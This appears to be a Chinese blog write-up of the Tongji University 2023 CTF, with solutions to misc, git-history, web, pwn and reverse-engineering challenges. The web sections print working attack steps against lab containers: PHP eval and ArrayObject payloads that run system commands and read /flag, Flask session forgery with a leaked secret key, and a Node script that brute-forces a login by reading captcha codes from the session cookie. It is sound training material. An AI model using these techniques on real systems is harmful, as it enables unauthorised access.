---
title: 'Tongji CTF 2023'
slug: 'tongji-ctf-2023'
date: 2023-05-11T13:33:13+08:00
draft: false
tags: []
categories: []
---

# **同济大学第五届网络安全竞赛 WRITEUP**

## **Misc**

### **1. 天狗不可告人的过往**

![](/images/2023/009.png)

解题思路：

题目是一个在线文档，内容是很简单的内容，跟 tjctf{} flag 无关，且由于腾讯文档官方网站并不是赛事举办方可控制的，所以优先考虑是把 flag 信息放到了在线文档的编辑历史里面。

解题过程：

找到第一版历史记录，从左方历史内容可以找到 flag: <span style="color: #2a8dd5">tjctf{this_1s_a_s3cret}</span>

![](/images/2023/010.png)

![](/images/2023/011.png)

### **2. 天狗的规则**

![](/images/2023/012.png)

解题思路：

藏在规则页面里面，打开规则页面，打开开发者工具，然后搜索 tj 即可找到隐藏的 flag

<span style="color: #2a8dd5">tjctf{make_sure_you_read_all_the_rules}</span>

![](/images/2023/013.png)

### **3. 天狗的 Git 学位考核**

![](/images/2023/014.png)

首先通过 git log 查看当前分支里面的提交，发现提交里面仅包含了 readme.md 的相关信息

![](/images/2023/015.png)

于是查看是否存在其他的分支，可以发现 secret 分支，secret 分支里面包含了加密脚本的提交

![](/images/2023/016.png)

![](/images/2023/017.png)

![](/images/2023/018.png)

通过 `git show 0f2d9ed3372f94aa2a3361167ba577c3b5762e93`，发现 flag 并不直接存在 flag 文件之中，所以考虑分析 encrypt.py

![](/images/2023/019.png)

从 git 历史中恢复 encrypt.py，`git revert 08b4a36a39d9f9ee0496a497c8783105c98b6ca9`

![](/images/2023/020.png)

```python
def encrypt(secret, path1, path2):
    def pad(pt):
        sz = AES.block_size - (len(pt) % AES.block_size)
        return pt + sz * bytes([sz])
    key = md5(b'xyptql').hexdigest().encode()
    cipher = AES.new(key, AES.MODE_ECB)
    enc = cipher.encrypt(pad(secret.encode()))
    with open(path1, 'wb') as f:
        f.write(enc[::2])
    with open(path2, 'wb') as f:
        f.write(enc[1::2])
if __name__ == '__main__':
    encrypt(environ['flag'], 'flag', 'flag2')
```

通过主要代码可以分析出，该加密方法会在加密后，把加密后的字节流存放到两个文件中，把偶数位（从 0 开始）的字节放到 flag 文件中，把奇数位的字节放到 flag2 中，然而在 git 的历史中并没有找到跟 flag2 相关的信息，通过历史可以很容易的还原出 flag 文件（前文提到过），master 和 secret 分支历史中都没有找到 flag2，因此可以考虑是进行了分支的强行删除或者 rebase 操作，所以导致在 git log 中无法找到对应的提交。

所幸 git 存在一种方法直接查看所有的 git 提交历史，git log \--reflog

![](/images/2023/021.png)

![](/images/2023/022.png)

注意 commit 的 hash 值并不同，在 `868c5a3cc85b05abf1c7df454f1c6a7355ffa23d` 中包含了 flag 和 flag2

![](/images/2023/023.png)

把这个删除 flag 和 flag2 的提交 revert 之后就得到了加密后的信息，编写一下解密代码：

```python
from Crypto.Util.Padding import unpad
def decrypt(c1, c2, path):
    with open(c1, 'rb') as f:
        enc1 = f.read()
    with open(c2, 'rb') as f:
        enc2 = f.read()
    enc = [rv for r in zip(enc1,enc2) for rv in r]
    print(enc)
    key = md5(b'xyptql').hexdigest().encode()
    cipher = AES.new(key, AES.MODE_ECB)
    dcp = unpad(cipher.decrypt(bytes(enc)),AES.block_size)
    print(dcp.decode())
    with open(path, 'wb') as f:
        f.write(dcp)
if __name__ == '__main__':
    decrypt('flag1', 'flag2', 'flagm')
```

然后进行解密，即可在生成的文件以及控制台中看到原始的 flag:
<span style="color: #2a8dd5">tjctf{y0u_4re_rE4lLy_g1T_mASTer}</span>

![](/images/2023/024.png)

## **Pwn**

### **4. nc-test**

![](/images/2023/025.png)

按照题目说明，下载 netcat 之后，开启实例，执行命令即可。

```bash
.\nc64.exe 10.10.175.247 34133
```

得到 flag:
<span style="color: #2a8dd5">flag{22f4462e-6cd7-4a4c-a009-aae3ff8629b5}</span>

![](/images/2023/026.png)

## **Web**

### **5. 天狗的会员制猜猜乐**

![](/images/2023/027.png)

解题过程：

点击网址直接进入一个页面，只有一个输入框，下意识打开开发者工具，但是打开开发者工具会直接跳转到 B 站《你被骗了》

因此直接利用 postman 来获取网页的源码（当然在网址前面加 view-source: 或者直接快捷键 ctrl+u 也可以直接查看网页源码）

![](/images/2023/028.png)

![](/images/2023/029.png)

可以发现不是一个正常的 javascript 代码，是一堆 \[\]()!+ 构成的脚本代码，但是首先可以确定这个是正确的代码可以跑。

如果善用搜索引擎或者曾经有所了解，就会发现这个东西叫 jsfuck，利用 javascript 的动态类型在进行操作符运算时会进行类型的隐式转换来实现的。

相关参考

http://www.jsfuck.com/

https://www.jianshu.com/p/11c33fbadae1

https://blog.csdn.net/qq_36539075/article/details/79946099

因此最简单的方法是从互联网上找一个在线的 jsfuck 的解码网站即可查看原来的 javascript 代码

比如：https://enkhee-osiris.github.io/Decoder-JSFuck/

![](/images/2023/030.png)

![](/images/2023/031.png)

然后复制到 vscode 里面进行查看，非常容易看出来整数数组就是 flag 对应的 ascii 的 code，因此直接从该数组得到对应的字符串即可，就可以得到 flag:
<span style="color: #2a8dd5">tjctf{c0ngrAtu14tI0Ns_yOu_FOund_Me}</span>

```js
console.log(
  [
    116, 106, 99, 116, 102, 123, 99, 48, 110, 103, 114, 65, 116, 117,49, 52,
    116, 73, 48, 78, 115, 95, 121, 79, 117, 95, 70, 79, 117, 110, 100,95, 77,
    101, 125
  ]
    .map((item) => String.fromCharCode(item))
    .join('')
);
```

![](/images/2023/032.png)

### **6. 天狗的秘密**

![](/images/2023/033.png)

首先下载附件，可以得到对应的服务端代码：首先可以得到我们要获得到 flag 的路径是 static/flag

![](/images/2023/034.png)

```python
app = Flask(__name__)
app.secret_key = ""
@app.route('/change_username', methods=['POST'])
def change_username():
    username = request.form['username']
    session['username'] = username
    session['pri'] = "normal"
    return redirect(url_for('index'))

@app.route('/read_secret',methods=['GET'])
def read_key():
    path = request.args.get("path")
    if path == None:
        path = "static/secrets"
    else:
        pattern = re.compile(r'../|..|')
        if pattern.search(path):
            return "No hacker!"
        pattern = re.compile(r'flag')
        if pattern.search(path) and session['pri'] != 'nvshen':
            return "No hacker!"
    with open(path,"r", encoding='utf-8') as fin:
        secrets = fin.read()
    return "不准告诉别人哦，{}".format(secrets)
```

从这部分代码中可以看到三部分内容

第一部分内容是，session 的密钥是直接卸载 app.py 文件中的

第二部分内容是，在访问文件时只过滤了尝试访问路径中带 flag 的或者父级目录之类的或者包含 \\ 的

第三部分内容是，倘若 session 中的 pri 是 nvshen 的情况中，则可以绕过对 flag 的过滤

因此现在方向是让 session\['pri'\] == 'nvshen'

想要破解 session 就需要知道给 session 字段加密的密钥，才能生成服务端认可的 session，

所幸，上述的第二部分内容存在一个 BUG，就是它没有过滤对 app.py 的访问，因此我们可以直接得到服务端中 app.py 的内容

![](/images/2023/035.png)

至此，secret_key 就拿到手了，下一步是生成 session\['pri'\] == 'nvshen' 的 session，那么最简单的办法就是，修改下载得到源码中的 app.py，

把得到 secret_key 填到文件中，并把 change_username 接口实现中的 normal 改成 nvshen，然后本地开启这个 web 服务，访问 change_username 接口即可获得拥有 nvshen 权限的 session

```python
app.secret_key = "dalpdqdqd-#%^cazcsad;asdafad"
@app.route('/change_username', methods=['POST'])
def change_username():
    username = request.form['username']
    print(username)
    session['username'] = username
    session['pri'] = "nvshen"
    return redirect(url_for('index'))
```

![](/images/2023/036.png)

在 postman 中对应的自己开启的容器的域名下添加这个 session

![](/images/2023/037.png)

然后再去读取 static/flag 即可得到本题的 flag:
<span style="color: #2a8dd5">flag{0ec0a7cc-96a1-4693-8014-9c6835c9b3c2}</span>

![](/images/2023/038.png)

### **7. 天狗的一句话**

![](/images/2023/039.png)

解题过程：

本题的附件是一个浏览器插件，用来一些接口的相关操作的，我解题没有使用这个插件，直接在 postman 中完成即可

![](/images/2023/040.png)

直接打开启动的容器实例，可以看到后端是使用 php 来写的，然后 eval 会直接把
\$\_POST\[1\] 中的内容当作 php 代码进行执行

这里很明显存在着较大的漏洞，利用 eval 可以达到很多操作。

由于代码只有一行，所以按照自然的逻辑，先看看当前目录里面有什么文件吧！

在 POST 请求的 body 中选择 formdata,
key 为 1 填入如下代码：利用 DirectoryIterator 可以遍历获取某个文件夹中的文件

```php
foreach (new DirectoryIterator('.') as $fileInfo) {
    if ($fileInfo->isDot()) continue;
    echo $fileInfo->getFilename() . "<br\>n";
}
```

![](/images/2023/041.png)

不难发现同目录下面存在着一个文件 flag.sh，这里指定大有文章，我们再来获取一下这个文件的内容

可以利用 readfile 函数获取文件内容

![](/images/2023/042.png)

可以看到该脚本会把存放在环境变量中的 flag 的值存放到 /flag 文件中，顺理成章我们可以利用 php 的 system 函数执行 flag.sh，然后再如法炮制，读取 /flag 的内容即可获得本题的 flag：
<span style="color: #2a8dd5">flag{a5507c7f-02b4-4d79-8284-6dbafef3bda0}</span>

执行 flag.sh `$x=system('./flag.sh'); var_dump($x);`

读取 /flag `$x=readfile('/flag'); var_dump($x);`

![](/images/2023/043.png)

![](/images/2023/044.png)

### **8. 天狗的 PHP**

![](/images/2023/045.png)

解题过程：

直接访问容器可以得到源代码：

```php
<?php
error_reporting(0);
show_source(__FILE__);

$a = $_GET["a"];
$b = $_GET["b"];
$c = $_GET["c"];
$d = $_GET["d"];
$e = $_GET["e"];
$f = $_GET["f"];
$g = $_GET["g"];

if (preg_match("/Error|ArrayIterator|SplFileObject/i", $a)) {
    die("什么原生类，我不懂啊");
}

if (preg_match("/php/i", $b)) {
    die("根本用不上");
}

if (preg_match("/Error|ArrayIterator/i", $c)) {
    die("现在是，幻想时间");
}

$class = new $a($b);
$str1 = substr($class->$c(), $d, $e);
$str2 = substr($class->$c(), $f, $g);
$str1($str2);
```

读完代码之后可以看到重点内容 `$str1($str2)` ，`$str1` 和 `$str2` 分别是 `$class->c()` 结果字符串的一部分，

因此倘若我们能让 $str1 == 'system' 或者 'eval' 等函数，我们就可以像前面天狗的一句话那样进行同样的操作获取 flag

但是代码同样对 $a $b $c 进行了检查，从 `$class = new $a($b)` 可知 $a 需要是一个类的名字，而 $b 则是这个类的构造函数的参数，

从代码可以看出来 `Error\|ArrayIterator\|SplFileObject` 这三个类都被过滤了，但是我们还可以使用诸如 Exception，JsonException，ArrayObject 等类

为什么是这几个类，这是因为这个类生成对象的时候需要一个参数，且在执行它的某个方法时能够生成一个字符串，这些我们才能顺利的将我们想要注入的函数注入到 $str1 中，Exception 和 JsonException 具有 \_\_toString 方法，而 ArrayObject 则具有 serialize 方法。

所以接下来我们就使用 ArrayObject 来尝试传递我们的 $b 的内容吧

（其实是我这三个都使用并测试了，Exception 和 JsonException 在本地能够达到效果，但是在比赛的容器中没有效果）

与天狗的一句话相同的思路，我们先试图获取当前目录下的文件：还是同样的利用 system 函数执行系统中的命令，$b 需要是一个数组，因为 ArrayObjec t 的构造函数的参数要求是一个数组，http query 中传递数组需要在 key 后面增加\[\]，即 b\[\]=xxxx&b\[\]=yyyy

```php
$a = "ArrayObject";
$b = ["system", "ls -al"];
$c = "serialize";
$xxx = new $a($b);
echo $xxx->$c();
```

在本地通过这个先来查看一下自己想要构造的 $b 在 ArrayObject 对象进行 serialize 之后生成的字符串是什么样子的。

![](/images/2023/046.png)

我们可以看到 system 对应的字串的位置是 从 20 开始的 6 个字符

而 ls -al 则是从 37 开始的 6 个字符

因此 $d 就是 20 $e 是 6 $f 是 37 $g 是 6

将我们构造下来参数在 postman 中跑起来看一下：

![](/images/2023/047.png)

![](/images/2023/048.png)

可以看到与天狗的一句话十分相似的是，同目录下也存在一个 flag.sh，想必跟前者是一样的套路。

获取一下 flag.sh 的内容，构造 `$b = ['system', 'catflag.sh']`，然后重复前面的流程计算$d $e $f $g

![](/images/2023/049.png)

但是当我去尝试执行这个 flag.sh，然后再去读取 /ffff123hahahlalalbaklalal
文件，我发现读取不了，排查后发现是因为 flag.sh
并不是一个可执行文件，在前一步进行 ls -al
中的结果说明了这一点。于是我尝试利用 chmod 给 flag.sh 文件修改权限，然后经过尝试，flag.sh 文件并不能增加执行权限。

我无法使用 sudo，我不知道密码

此时仿佛陷入了死局，但是来都来了，不如 ls 一下根目录？毕竟 ffff123hahahlalalbaklalal 文件就在根目录。

![](/images/2023/050.png)

然后我们会惊奇的发现，居然在根目录下也有一个 flag.sh
且它拥有完整的执行权限，所以我们尝试去执行这个 flag.sh 试试

然后就可以正常的获取到本题的 flag 了：<span style="color: #2a8dd5">flag{04b632d1-269a-4015-9d85-ead20f4b6665}</span>

![](/images/2023/051.png)

### **9. 天狗的爆破**

![](/images/2023/052.png)

解题思路：分析源码

```python
@app.route("/")
def index():
    res = make_response(render_template("index.html"))
    sid = request.cookies.get("sid")
    if sid not in session:
        sid = secrets.token_hex(16)
        session[sid] = secrets.token_hex(16)
    res.set_cookie("sid", sid)
    return res
```

直接访问时会生成一个 sid 放到 coolkie 中的键 sid 中

```python
@app.route("/getCaptcha")
def getCaptcha():
    sid = request.cookies.get("sid")
    code, image = generate_captcha()
    if sid in session:
        session[sid] = code
    print(session)
    return send_file(image, mimetype="image/jpeg")
```

获取验证码的时候，会把一个随机的 code 放到 session 中的 sid 中

```python
@app.post("/login")
def login():
    sid = request.cookies.get("sid")
    if sid not in session:
        return "invalid cookie"
    data = request.get_json()
    print(data)
    code = str(data["code"])
    pwd = str(data["password"])
    if code == session[sid]:
        if pwd == password:
            msg = flag
        else:
            msg = "wrong password"
    else:
        msg = "invalid code"
    session[sid] = secrets.token_hex(16)
    return msg
```

登录时首先要 cookie 中存有键 sid，且该键 sid 的值必须是 session 的一个键，然后当我们 post 中提交的 code（即验证码）跟 `session[sid]` 的值相等，且我们输入对了密码的情况下，就可以获取到 flag 了。（当然本题是暴力破解）

因此想要不断的尝试密码，首先要访问首页获取到一个 sid，存放到 cookie 的键 sid 中，即 sid=xxxxxxxxxxxxx;

然后获取验证码，然后再 post 密码和正确的对应的验证码进行尝试。

由于获取验证码的接口把验证码对应的 code 存放到了 session 中，因此我们可以很方便的从 session 中获取到对应的 code，而不用管那个验证码图片到底长什么样。这是因为 session 的字符串实际上是由一个英文的点分割的两部分组成，前一部分存放的是 base64 编码之后的 json 数据，后一部分则是使用密钥对前者进行的签名。意即前一部分存放的其实明文信息，只是经过了 base64 编码，我把前一部分提取出来，base64 解码，然后 json 解析即可顺利的获取到每一个验证码对应的 code。

具体实施时，我先使用 postman 获取了一个 sid 以及获取了一次验证码。

然后我再利用 node，来写一个自动化的网络请求脚本即可，下面是脚本内容：

首先是获取验证码：

```js
export const getCapture = async () => {
  const myHeaders = new Headers();
  myHeaders.append(
    'Cookie',
    'session=.eJwFwYkRwCAIBMBeqOAUEEw3ytNEJr1n9yWtOmCRWMFyzOHr6sTI3TN8gB7yE4pVva2uI_sCLR6cqdMSQt8PrO0TNQ.ZFhquw.WCp4NsvXmUBHcGpIrBGIIyuRQ3Y;sid=5eea0344c6c34a78086b5201d9f2c810'
  );
  const requestOptions = {
    method: 'GET',
    headers: myHeaders,
    redirect: 'follow'
  };

  const res = await fetch(
    'http://10.10.175.247:33708/getCaptcha',
    requestOptions
  ).then((response) => response);
  const sessionSetter = res.headers
    .getSetCookie()[0]
    .match(/session=([^;]*);/)[0];
  const session = res.headers.getSetCookie()[0].match(/session=([^.]*)./)[1];
  const sessionOrigin = JSON.parse(atob(session));
  const code = sessionOrigin['5eea0344c6c34a78086b5201d9f2c810'];
  return [sessionSetter, code];
};
```

这里 5eea0344c6c34a78086b5201d9f2c810
即是我直接访问主页获取到的 sid，这个在暴力尝试过程中可以保持不变

然后是进行密码的尝试：

```js
const tryIt = async (password) => {
  const [sessionSetter, code] = await getCapture();
  const myHeaders = new Headers();
  myHeaders.append('Content-Type', 'application/json');
  myHeaders.append(
    'Cookie',
    `${sessionSetter} sid=5eea0344c6c34a78086b5201d9f2c810`
  );

  const raw = JSON.stringify({
    code: code,
    password: password
  });

  const requestOptions = {
    method: 'POST',
    headers: myHeaders,
    body: raw,
    redirect: 'follow'
  };

  fetch('http://10.10.175.247:33708/login', requestOptions)
    .then((response) => response.text())
    .then((result) => console.log(result))
    .catch((error) => console.log('error', error));
};

async function boom() {
  try {
    const data = fs.readFileSync('top10000.txt', 'UTF-8');
    const lines = data.split(/r?n/);
    for (let i = 3333; i <= 6666; i++) {
      await tryIt(lines[i]);
    }
  } catch (err) {
    console.error(err);
  }
}

boom();
```

然后 node main.mjs 即可运行该暴力破解脚本

这里使用的 top10000.txt 文件的第 3333 行到第 6666 行，是因为在源码中

```python
with open("./top10000.txt", "r") as fp:
    password = fp.read().split("n")[randint(3333, 6666)]
```

密码正是这个范围中的一个，所以这么尝试可以减少试错次数

暴力测试过程中即可得到本题的 flag：<span style="color: #2a8dd5">tjctf{ARe_yoU_HAPPY_W1TH_c4ptCh@-FhQgnesGBaHTs}</span>

看到 flag 出现时，直接 crtl+c 结束即可

![](/images/2023/053.png)

## **Reverse**

### **10. 天狗教你用 IDA**

![](/images/2023/054.png)

解题思路：下载得到的附件其实是一个编译后的二进制文件，按照题目下载安装一个 IDA 软件

然后在 IDA 软件中打开这个二进制文件：

![](/images/2023/055.png)

双击打开 main 函数，并点击右方的汇编代码，然后在上方工具栏中 `Jump` 中选择
`Jump to pseudocode`,可以得到：

![](/images/2023/056.png)

通过上方面的伪代码分析，不难看出，该代码对用户输入的字符串进行了一些转换，然后拿转换后字符串跟

```text
0s_nt_pw1IDryA_O4}_{cj_@ofuktcnu
```

这个字符串进行比较，相同就证明我输入了正确的本题的 flag，因此顺着图中的转换思路，将这个字符串反向转换就能得到本题的 flag 了

main 函数中对用户的输入进行了下面这样的转换（使用 js 表达）：

```js
const s = '<span style="color: #2a8dd5">tjctf{...}</span>'.split('');
const x = s[0];
s[0] = s[10];
s[10] = s[26];
s[26] = s[15];
s[15] = s[14];
s[14] = s[24];
s[24] = s[30];
s[30] = s[19];
s[19] = s[5];
s[5] = s[20];
s[20] = s[17];
s[17] = s[31];
s[31] = s[21];
s[21] = s[1];
s[1] = s[22];
s[22] = s[16];
s[16] = s[23];
s[23] = s[18];
s[18] = s[7];
s[7] = s[11];
s[11] = s[29];
s[29] = s[2];
s[2] = s[12];
s[12] = s[13];
s[13] = s[27];
s[27] = s[8];
s[8] = s[25];
s[25] = s[4];
s[4] = s[3];
s[3] = s[9];
s[9] = s[6];
s[6] = s[28];
s[28] = x;
```

因此写如下的脚本反向转换即可得到本题的 flag:
<span style="color: #2a8dd5">tjctf{I_kn0w_yOu_c@n_us4_1DApro}</span>

```js
const xxx = '0s_nt_pw1IDryA_O4}_{cj_@ofuktcnu';
const s = xxx.split('');
const y = s[28];
s[28] = s[6];
s[6] = s[9];
s[9] = s[3];
s[3] = s[4];
s[4] = s[25];
s[25] = s[8];
s[8] = s[27];
s[27] = s[13];
s[13] = s[12];
s[12] = s[2];
s[2] = s[29];
s[29] = s[11];
s[11] = s[7];
s[7] = s[18];
s[18] = s[23];
s[23] = s[16];
s[16] = s[22];
s[22] = s[1];
s[1] = s[21];
s[21] = s[31];
s[31] = s[17];
s[17] = s[20];
s[20] = s[5];
s[5] = s[19];
s[19] = s[30];
s[30] = s[24];
s[24] = s[14];
s[14] = s[15];
s[15] = s[26];
s[26] = s[10];
s[10] = s[0];
s[0] = y;
console.log(s.join(''));
```

![](/images/2023/057.png)

# **总结**

这次的 CTF 让我收获良多，我也是第一次参加这种比赛，虽然我有足够多的 WEB 知识，但是这其中有很多东西都是我所不了解的，这些题目也让我深刻体会到信息安全的问题很多，一句简单的代码都可能带来严重的后果。

也有一些遗憾，有一些题目我是有思路的但是没有做出来，还是有很多东西需要学习，比如流量的藏压缩包和二维码密码，流密码一两次异或可以得到原来的数据，只要找到正确的时间就能得到伪随机相同的密钥，再把加密后的文件经过同样的流程再加密一次就能得到原来的图片。还有 RSA 都是 e 和(p-1)\*(q-1) 不互素的情况，需要使用 AMM 算法好像，但是我实力不济，没有整出来，有遗憾，但是也有诸多收获，希望下次还能参加，加油！
